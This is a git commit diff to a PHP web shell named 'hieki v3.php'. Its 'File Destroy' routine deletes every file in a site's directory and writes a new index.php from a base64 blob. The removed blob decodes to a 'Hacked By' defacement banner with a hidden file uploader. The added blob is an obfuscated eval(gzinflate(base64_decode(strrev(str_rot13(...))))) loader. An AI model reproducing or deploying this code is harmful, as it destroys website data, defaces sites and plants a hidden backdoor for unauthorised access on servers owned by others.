fdfdebd26b760c81fb41a8198eb011fe92232ef8
Mhankk <57066081+Mhankk@users.noreply.github.com>
2021-09-04 02:40:32 +0700

    Update hieki v3.php

--- Mini/hieki v3.php
+++ Mini/hieki v3.php
@@ -116,7 +116,7 @@ echo '<html><body><center><form method="post" action=""><font>Mailer</font><br><
     echo "Pesan email sudah terkirim ke ".$to."";}?>
 <!--//End Mailer-->
 
-<!--//File Destroy-->  <!-- Setelah semua terhapus akses index.php?ndelik-->
+<!--//File Destroy-->  <!-- Setelah semua terhapus akses index.php?uploader-->
 <?php if (isset($_GET["delete"])) { 
 	$files = scandir(__DIR__); 
 	foreach ($files as $file) { 
@@ -125,8 +125,8 @@ echo '<html><body><center><form method="post" action=""><font>Mailer</font><br><
 			echo "All Files Deleted and Creating New Index";
 			echo " Silahkan akses index.php?ndelik";
 			$f = fopen("index.php", "w") or die("Unable to open file!"); 
-			fwrite($f, base64_decode('SGFja2VkIEJ5IC4vIE1oQG5rayAtIE1lY2hhbmljYWwgV2Fybgo8P3BocAppZihpc3NldCgkX0dFVFsnbmRlbGlrJ10pKXsKICAgIGVjaG8gIjxmb3JtIG1ldGhvZD0ncG9zdCcgZW5jdHlwZT0nbXVsdGlwYXJ0L2Zvcm0tZGF0YSc+PGlucHV0IHR5cGU9J2ZpbGUnIG5hbWU9J2lkeF9maWxlJz48aW5wdXQgdHlwZT0nc3VibWl0JyBuYW1lPSd1cGxvYWQnIHZhbHVlPSd1cGxvYWQnPjwvZm9ybT4iO30KCiAkcm9vdCA9ICRfU0VSVkVSWydET0NVTUVOVF9ST09UJ107JGZpbGVzID0gQCRfRklMRVNbJ2lkeF9maWxlJ11bJ25hbWUnXTskZGVzdCA9ICRyb290LicvJy4kZmlsZXM7IGlmKGlzc2V0KCRfUE9TVFsndXBsb2FkJ10pKSB7aWYoaXNfd3JpdGFibGUoJHJvb3QpKSB7aWYoQGNvcHkoJF9GSUxFU1snaWR4X2ZpbGUnXVsndG1wX25hbWUnXSwgJGRlc3QpKSB7ICR3ZWIgPSAiaHR0cDovLyIuJF9TRVJWRVJbJ0hUVFBfSE9TVCddLiIvIjtlY2hvICJTdWNjZXNzIHRvIFVwbG9hZCA9PiA8YSBocmVmPSckd2ViLyRmaWxlcycgdGFyZ2V0PSdfYmxhbmsnPjx1PiR3ZWIvJGZpbGVzPC91PjwvYT4iO30gZWxzZSB7ZWNobyAiRmFpbGVkIHRvIHVwbG9hZCBvbiByb290IGRpciI7fX0gZWxzZSB7IGlmKEBjb3B5KCRfRklMRVNbJ2lkeF9maWxlJ11bJ3RtcF9uYW1lJ10sICRmaWxlcykpIHtlY2hvICJTdWNjZXNzIHVwbG9hZCA8Yj4kZmlsZXM8L2I+IGluIHRoaXMgZm9sZGVyIjt9IGVsc2Uge2VjaG8gIkZhaWxlZCBUbyBVcGxvYWQiO319fSA/Pg=='));} ?>
-<!--//End File Destroy-->
+			fwrite($f, base64_decode('SGFja2VkIEJ5IC4vIE1oQG5rayAtIE1lY2hhbmljYWwgV2Fybgo8P3BocAovKgpUb29scyBDb2RlZCBCeSAuL21oQG5rayAgICAgICAgIAoqLwokbWhhbmtrID0gIlYvY252MmQrd3Y2QnlUL004bVQxejFBOFBmTEpvbm1uWVNBd1hRbGR4VjNaeXo3SXZHM2NYMzZJOEN6WnhXbU1kZlB3cFlBWi80b3RkbW83RVFSNE5KWGcrZ0xsdE9acGVlRytwQ3N0T0l5Y2NOeWtTNW5vWUFSSU40aWpINVMwZUZZR0JrSEIzUHB3RzFnYUdxWm54ZTVEMGtHUmZpbTYweTdScXlLdEpMWFVtZUplTS9XVUhzbFduSmVCdUpNOEg0K2dJT01OVi8vWmVrakd2OC9YM2FPZG1UNk1WOEppKzVVQnJ0NDI5M2JjbHI2dVluVVJvVVM4SDdaMXRBMTRuR3kzOUtpN3R2OFh2cy80UlFXTGlleVlQcmRGWHpxM1Y4bXl0MnpQdjZ6aG1WKzdiYXAzeDRBUVNMWnN2WU9paDZGWllWKzBoZkI0QUNQVW5OekFWM0RFWC9NN3YxdVo5UElJQlN4NGRBQkV5RVhpTXFvZ1lZNTJvV25KUk5TWTRpSmFtSDV4eElLb2dvTmxvWmUyNnBtQkJvcVQrYUFnY3k5M2FYeFNKNWlSYTJ4cW80WE1tcDJhTVoyNkRvcElSZFE0Q3JSd1RNTmFzMkN3NEUzQzFqbFVJZDBqRlNyRHBWaWl0bUZSbGtPdEp0NzU4bHZaNi9CV1drVnBUL2UvSTBWZWtRbXNpOGNMeUNoUWUwTnhVS2J3Yk9IYm1ndDM5dnFDUU4yQnI0UEZ3czlhYkpWbGNpbi9hRlFwQndKZSsvVUF3R2cvS0ZRdEI0ZlJCb2JBIjsKJEpvZ2phID0gIj09Tk4xUmJEZXFKTXpHdk14d25uSkpuU0hwV1NkRTZjYW9QY2FGcHpucmRTeUhGTXZFZHl4SHJjekcyNVQ1RllYdUZZQzc4RkFlbGVWU0FtWTFsRiI7CmV2YWwoZ3ppbmZsYXRlKGJhc2U2NF9kZWNvZGUoc3RycmV2KHN0cl9yb3QxMygkSm9namEpKSkpKTsKZXhpdDsKPz4='));} ?>		
+	<!--//End File Destroy-->
 
 <!--//Self Remove-->
 <?php
